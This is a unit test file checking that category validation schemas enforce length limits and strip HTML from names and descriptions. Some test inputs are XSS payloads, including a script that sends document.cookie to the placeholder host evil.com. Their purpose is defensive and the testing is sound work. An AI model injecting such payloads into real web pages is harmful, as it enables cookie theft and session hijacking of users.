import { describe, it, expect } from 'bun:test'
import { createCategorySchema, updateCategorySchema } from '../../validations/categoryValidation'

describe('createCategorySchema', () => {
  it('accepts a valid category', () => {
    const result = createCategorySchema.safeParse({ name: 'Shoes', description: 'All shoes' })
    expect(result.success).toBe(true)
  })

  it('accepts a category without description (defaults to empty string)', () => {
    const result = createCategorySchema.safeParse({ name: 'Shoes' })
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.description).toBe('')
    }
  })

  it('strips HTML tags from name', () => {
    const result = createCategorySchema.safeParse({
      name: '<script>alert("xss")</script>Shoes',
      description: 'desc',
    })
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.name).toBe('Shoes')
      expect(result.data.name).not.toContain('<script>')
    }
  })

  it('strips HTML tags from description', () => {
    const result = createCategorySchema.safeParse({
      name: 'Shoes',
      description: '<b>Bold</b> description with <img src=x onerror="evil()">',
    })
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.description).toBe('Bold description with')
    }
  })

  it('strips iframe injection from description', () => {
    const result = createCategorySchema.safeParse({
      name: 'Shoes',
      description: '<iframe src="javascript:alert(1)">content</iframe>',
    })
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.description).not.toContain('<iframe>')
      expect(result.data.description).toBe('content')
    }
  })

  it('rejects empty name', () => {
    const result = createCategorySchema.safeParse({ name: '' })
    expect(result.success).toBe(false)
    if (!result.success) {
      expect(result.error.issues[0].path).toContain('name')
    }
  })

  it('rejects name exceeding 100 characters', () => {
    const result = createCategorySchema.safeParse({ name: 'A'.repeat(101) })
    expect(result.success).toBe(false)
    if (!result.success) {
      expect(result.error.issues[0].path).toContain('name')
    }
  })

  it('rejects description exceeding 500 characters', () => {
    const result = createCategorySchema.safeParse({
      name: 'Shoes',
      description: 'A'.repeat(501),
    })
    expect(result.success).toBe(false)
    if (!result.success) {
      expect(result.error.issues[0].path).toContain('description')
    }
  })
})

describe('updateCategorySchema', () => {
  it('accepts partial update with only name', () => {
    const result = updateCategorySchema.safeParse({ name: 'New Name' })
    expect(result.success).toBe(true)
  })

  it('accepts partial update with only description', () => {
    const result = updateCategorySchema.safeParse({ description: 'New description' })
    expect(result.success).toBe(true)
  })

  it('rejects empty object (at least one field required)', () => {
    const result = updateCategorySchema.safeParse({})
    expect(result.success).toBe(false)
  })

  it('strips HTML tags from name in update', () => {
    const result = updateCategorySchema.safeParse({
      name: '<strong>Footwear</strong>',
    })
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.name).toBe('Footwear')
    }
  })

  it('strips XSS from description in update', () => {
    const result = updateCategorySchema.safeParse({
      description: '<script>fetch("//evil.com?c="+document.cookie)</script>desc',
    })
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.description).toBe('desc')
    }
  })

  it('rejects name exceeding 100 characters on update', () => {
    const result = updateCategorySchema.safeParse({ name: 'A'.repeat(101) })
    expect(result.success).toBe(false)
  })
})
